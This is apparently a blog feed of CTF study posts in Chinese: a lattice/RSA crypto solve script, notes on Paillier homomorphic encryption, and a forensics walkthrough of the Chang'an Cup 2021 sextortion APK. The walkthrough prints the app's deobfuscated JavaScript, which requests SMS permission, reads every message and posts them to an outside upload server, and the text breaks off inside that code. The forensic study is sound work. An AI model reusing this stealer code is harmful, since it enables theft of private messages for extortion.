class="hljs-number">18797057418663411295612229938999282286746920748194349166509084258061650142260043277698907538088835210620841171754186980908772147495732980563542600139935202965632319542217264685208215907551992891370166006725534397313373079841419662622936316343820775075897977228084528246337988431658221881343556854053475137330</span>]<br><br>n1 = <span class="hljs-number">20</span><br><span class="hljs-keyword">for</span> D <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    m = matrix(ZZ,n1,n1+<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n1):<br>        m[i,i] = <span class="hljs-number">1</span><br>        m[i,n1] = D*e[i]<br>    L = m.LLL()<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    if L[0][-1] == D:</span><br><span class="hljs-string">        print(D)</span><br><span class="hljs-string">        print(L)</span><br><span class="hljs-string">        break</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    m1 = prod([x ^ y <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(out,L[<span class="hljs-number">0</span>][:-<span class="hljs-number">1</span>])])<br>    m2 = prod([x ^ y <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(out,L[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])])<br><br>    n = gcd(m1.numer() - m1.denom(), m2.numer() - m2.denom())<br>    <span class="hljs-comment">#print(n)</span><br>    e_list = [<span class="hljs-number">2333</span>,<span class="hljs-number">23333</span>]<br>    c_list = [c1,c2]<br>    g,x,y = xgcd(e_list[<span class="hljs-number">0</span>],e_list[<span class="hljs-number">1</span>])<br><br>    a = <span class="hljs-built_in">pow</span>(c_list[<span class="hljs-number">0</span>],x,n)*<span class="hljs-built_in">pow</span>(c_list[<span class="hljs-number">1</span>],y,n) % n<br>    b = output2 - a*output1 % n<br>    <br>    ans = long_to_bytes(b)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NSS&#x27;</span> <span class="hljs-keyword">in</span> ans:<br>        <span class="hljs-built_in">print</span>(ans)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure></\span></span>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto基础篇-同态加密</title>
    <link href="/2025/05/29/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"/>
    <url>/2025/05/29/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Paillier同态加密"><a href="#Paillier同态加密" class="headerlink" title="Paillier同态加密"></a>Paillier同态加密</h1><p><strong>密钥生成：</strong></p><ul><li>随机选择两个大素数$p,q$，满足$gcd(pq,(p-1)(q-1))&#x3D;1$</li><li>计算$n &#x3D; pq$，$\lambda &#x3D;lcm(p-1,q-1)$</li><li>选择随机整数$g（g\in Z^*_{n^2}）$，定义$L(x)&#x3D; \frac{x-1}{n}$，满足$gcd(L(g^\lambda \mod n^2),n)&#x3D;1$</li><li>计算$\mu &#x3D; (L(g^\lambda \mod n^2))^{-1}\mod n$</li><li>公钥为$(n,g)$，私钥为$(\lambda,\mu)$</li></ul><blockquote><p><strong>二项定理：</strong><br>$(1+kn)^m\equiv knm+1 \mod n^2$<br>此时有$g^\lambda\equiv 1\mod n$，$g^{n\lambda}\equiv 1 \mod n^2$</p></blockquote><p><strong>简化版：</strong></p><ul><li>$g&#x3D;n+1$</li><li>$\lambda&#x3D;\phi(n)&#x3D;(p-1)(q-1)$</li><li>$\mu &#x3D; \phi(n)^{-1}\mod n$<br><strong>加密：</strong></li><li>明文$m（0\leq m &lt; n）$</li><li>选择随机数$r(0&lt;r&lt;n,r\in Z^*_{n^2})$，且$gcd(r,n)&#x3D;1$</li><li>密文$c&#x3D;g^mr^n\mod n^2$<br><strong>解密：</strong></li><li>明文$m&#x3D;L(c^{\lambda}\mod n^2)\mu \mod n$</li></ul><p><strong>性质：</strong><br>$D(E(m_1,r_1)⋅E(m_2,r_2)\mod n^2)&#x3D;m_1+m_2 \mod n$<br>$D(E(m_1,r_1)⋅g^{m_2}\mod n^2)&#x3D;m_1+m_2 \mod n$<br>$D(E(m_1,r_1)^{m_2}\mod n^2)&#x3D;m_1m_2\mod n$<br>$D(E(m_2,r_2)^{m_1}\mod n^2)&#x3D;m_1m_2\mod n$<br>$D(E(m,r)^k\mod n^2)&#x3D;km\mod n$<br>$D(E(m,r)⋅(1+n)^k\mod n^2)&#x3D;m+k\mod n$</p><p><strong>参考：</strong> <a href="https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">其他加密算法 | Lazzaro</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电子取证-长安杯2021 学习记录</title>
    <link href="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>2021年4月25日，上午8点左右，警方接到被害人金某报案，声称自己被敲诈数万元；经询问，昨日金某被嫌疑人诱导裸聊，下载了某“裸聊”软件，导致自己的通讯录和裸聊视频被嫌疑人获取，对其进行敲诈，最终金某不堪重负，选择了报警；警方从金某提供的本人手机中，定向采集到了该“裸聊”软件的安装包–zhibo.apk（检材一），请各位回答下列问题：（题目 中需要通过分析出来的答案对检材二三四五解压，解压密码为IP的情况，需要在密码后增加-CAB2021，例192.168.110.110-CAB2021）</p><h2 id="检材"><a href="#检材" class="headerlink" title="检材"></a>检材</h2><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503213953574.png"><br>使用VeraCrypt挂载，挂载密码为</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">2021</span>第三届CAB-changancup.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><h3 id="请计算检材一Apk的SHA256值"><a href="#请计算检材一Apk的SHA256值" class="headerlink" title="请计算检材一Apk的SHA256值"></a>请计算检材一Apk的SHA256值</h3><p>使用HashCalc计算<code>检材一-zhibo.apk</code>的SHA256的hash值<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503215110738.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">3</span>fece<span class="hljs-number">1e93</span>be<span class="hljs-number">4</span>f<span class="hljs-number">422</span><span class="hljs-keyword">c</span><span class="hljs-number">8446</span>b<span class="hljs-number">77</span>b<span class="hljs-number">6863</span>eb<span class="hljs-number">6</span>a<span class="hljs-number">39</span>f<span class="hljs-number">19</span>d<span class="hljs-number">8</span>fa<span class="hljs-number">71</span>ff<span class="hljs-number">0250</span>aac<span class="hljs-number">10</span>f<span class="hljs-number">8</span>bdde<span class="hljs-number">73</span>a<br></code></pre></td></tr></table></figure><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><h3 id="该APK的应用包名为"><a href="#该APK的应用包名为" class="headerlink" title="该APK的应用包名为"></a>该APK的应用包名为</h3><p>使用jadx反编译，查看<code>AndroidManifest.xml</code>中的<code>package</code>便是应用包名<code>plus.H5B8E45D3</code><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503215236584.png"></p><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><h3 id="该APK程序在封装服务商的应用唯一标识（APPID）为"><a href="#该APK程序在封装服务商的应用唯一标识（APPID）为" class="headerlink" title="该APK程序在封装服务商的应用唯一标识（APPID）为"></a>该APK程序在封装服务商的应用唯一标识（APPID）为</h3><p>在<code>assets</code>文件夹下的<code>apps</code>中可以找到appid：<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503222512974.png"></p><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><h3 id="该APK具备下列哪些危险权限-多选题-："><a href="#该APK具备下列哪些危险权限-多选题-：" class="headerlink" title="该APK具备下列哪些危险权限(多选题)："></a>该APK具备下列哪些危险权限(多选题)：</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">A</span><span class="hljs-operator">.</span>读取短信  <br><span class="hljs-variable">B</span><span class="hljs-operator">.</span>读取通讯录  <br><span class="hljs-built_in">C</span><span class="hljs-operator">.</span>读取精确位置  <br><span class="hljs-built_in">D</span><span class="hljs-operator">.</span>修改通讯录  <br><span class="hljs-built_in">E</span><span class="hljs-operator">.</span>修改短信  <br></code></pre></td></tr></table></figure><p>各种权限：[chluo1997.github.io]</p><table><thead><tr><th>读取短信内容</th><th>android.permission.READ_SMS，读取短信内容</th></tr></thead><tbody><tr><td>读取联系人</td><td>android.permission.READ_CONTACTS，允许应用访问联系人通讯录信息</td></tr><tr><td>获取精确位置</td><td>android.permission.ACCESS_FINE_LOCATION，通过GPS芯片接收卫星的定位信息，定位精度达10米以内</td></tr><tr><td>写入联系人</td><td>android.permission.WRITE_CONTACTS，写入联系人，但不可读取</td></tr><tr><td>编写短信</td><td>android.permission.WRITE_SMS，允许编写短信</td></tr><tr><td><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503234602651.png"></td><td></td></tr><tr><td>因此选<code>ABCDE</code></td><td></td></tr></tbody></table><h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><h3 id="该APK发送回后台服务器的数据包含一下哪些内容-多选题-："><a href="#该APK发送回后台服务器的数据包含一下哪些内容-多选题-：" class="headerlink" title="该APK发送回后台服务器的数据包含一下哪些内容(多选题)："></a>该APK发送回后台服务器的数据包含一下哪些内容(多选题)：</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">A</span><span class="hljs-operator">.</span>手机通讯录  <br><span class="hljs-variable">B</span><span class="hljs-operator">.</span>手机应用列表  <br><span class="hljs-built_in">C</span><span class="hljs-operator">.</span>手机号码  <br><span class="hljs-built_in">D</span><span class="hljs-operator">.</span>验证码  <br><span class="hljs-built_in">E</span><span class="hljs-operator">.</span><span class="hljs-variable">GPS</span>定位信息<br></code></pre></td></tr></table></figure><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%7B9F186FA0-58B4-42EC-BF6B-4EA0FE0B68B3%7D.png"><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504170920520.png"><br>发现可疑代码：<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504171506835.png"><br><code>sojson.v4</code>解密得到：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/*</span><br><span class="hljs-comment">*Aman - 194nb.com</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Progcessed By JSDec in 0.00s</span><br><span class="hljs-comment"> *JSDec - JSDec.js.org</span><br><span class="hljs-comment"> */</span><br>mui.<span class="hljs-title function_">init</span>();<br><br>mui.<span class="hljs-title function_">plusReady</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-comment">//var main = plus.android.runtimeMainActivity();  </span><br><span class="hljs-comment">// main.moveTaskToBack(false);</span><br><br><span class="hljs-keyword">var</span> address = plus.<span class="hljs-property">device</span>.<span class="hljs-property">vendor</span> + <span class="hljs-string">&#x27;-&#x27;</span> + plus.<span class="hljs-property">device</span>.<span class="hljs-property">model</span>;<br>address = address.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\n/g</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/ /g</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\r/g</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">var</span> apiserver = <span class="hljs-string">&#x27;http://www.honglian7001.com/api/uploads/&#x27;</span>;<br><span class="hljs-comment">//重复数据处理 预防用户重复点击</span><br><span class="hljs-keyword">var</span> danjishijian = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requestPermission</span>(<span class="hljs-params">sjh, yqm</span>) &#123;<br>plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">requestPermissions</span>(<br>[<span class="hljs-string">&quot;android.permission.READ_SMS&quot;</span>],<br><span class="hljs-keyword">function</span> (<span class="hljs-params">resultObj</span>) &#123;<br><span class="hljs-comment">//SmsInfo存放一条短信的各项内容</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">SmsInfo</span> = &#123;&#125;<br><span class="hljs-comment">//Sms存放所有短信</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Sms</span> = &#123;&#125;<br><br><span class="hljs-keyword">var</span> aimei = sjh;<br><span class="hljs-keyword">var</span> aimei2 = yqm;<br><span class="hljs-keyword">var</span> duanxin = <span class="hljs-string">&#x27;[&#123;&quot;imei&quot;:&quot;&#x27;</span> + aimei + <span class="hljs-string">&#x27;&quot;,&quot;imei2&quot;:&quot;&#x27;</span> + aimei2 + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Cursor</span> = plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">importClass</span>(<span class="hljs-string">&quot;android.database.Cursor&quot;</span>)<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Uri</span> = plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">importClass</span>(<span class="hljs-string">&quot;android.net.Uri&quot;</span>)   <span class="hljs-comment">//注意啦，android.net.Uri中的net是小写</span><br><span class="hljs-keyword">var</span> activity = plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">runtimeMainActivity</span>()<br><span class="hljs-keyword">var</span> uri = <span class="hljs-title class_">Uri</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;content://sms/&quot;</span>);<br><br><span class="hljs-keyword">var</span> projection = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-string">&quot;_id&quot;</span>, <span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;person&quot;</span>, <span class="hljs-string">&quot;body&quot;</span>, <span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>)<br><span class="hljs-keyword">var</span> cusor = activity.<span class="hljs-title function_">managedQuery</span>(uri, projection, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;date desc&quot;</span>)<br><span class="hljs-keyword">var</span> idColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;_id&quot;</span>)<br><span class="hljs-keyword">var</span> nameColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;person&quot;</span>)<br><span class="hljs-keyword">var</span> phoneNumberColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;address&quot;</span>)<br><span class="hljs-keyword">var</span> smsbodyColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;body&quot;</span>)<br><span class="hljs-keyword">var</span> dateColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;date&quot;</span>)<br><span class="hljs-keyword">var</span> typeColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;type&quot;</span>)<br><span class="hljs-keyword">if</span> (cusor != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">while</span> (cusor.<span class="hljs-title function_">moveToNext</span>()) &#123;<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">id</span> = cusor.<span class="hljs-title function_">getString</span>(idColumn)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Name</span> = cusor.<span class="hljs-title function_">getInt</span>(nameColumn)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Date</span> = cusor.<span class="hljs-title function_">getLong</span>(dateColumn)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Date</span> = <span class="hljs-title function_">getFormatDate</span>(<span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Date</span>)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">PhoneNumber</span> = cusor.<span class="hljs-title function_">getString</span>(phoneNumberColumn)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Smsbody</span> = cusor.<span class="hljs-title function_">getString</span>(smsbodyColumn)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Type</span> = cusor.<span class="hljs-title function_">getString</span>(typeColumn)<br><br><span class="hljs-keyword">var</span> post = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-title class_">SmsInfo</span>);<br><span class="hljs-comment">//console.log(post);</span><br>duanxin = duanxin + <span class="hljs-string">&#x27;,&#x27;</span> + post;<br><br>&#125;<br>duanxin = duanxin + <span class="hljs-string">&#x27;]&#x27;</span>;<br><span class="hljs-comment">//alert(duanxin);</span><br><br>mui.<span class="hljs-title function_">ajax</span>(apiserver + <span class="hljs-string">&#x27;apisms&#x27;</span>, &#123;<br><span class="hljs-attr">data</span>: &#123;<br><span class="hljs-attr">data</span>: duanxin<br>&#125;,<br><span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//服务器返回json格式数据</span><br><span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTP请求类型</span><br><span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,<span class="hljs-comment">//超时时间设置为10秒；              </span><br><span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>mui.<span class="hljs-title function_">toast</span>(<span class="hljs-string">&#x27;获取成功&#x27;</span>)<br><span class="hljs-comment">//console.log(con)</span><br><br><br>&#125;,<br><span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">xhr, type, errorThrown</span>) &#123;<br><span class="hljs-comment">//异常处理；</span><br><br>&#125;<br>&#125;);<br>cusor.<span class="hljs-title 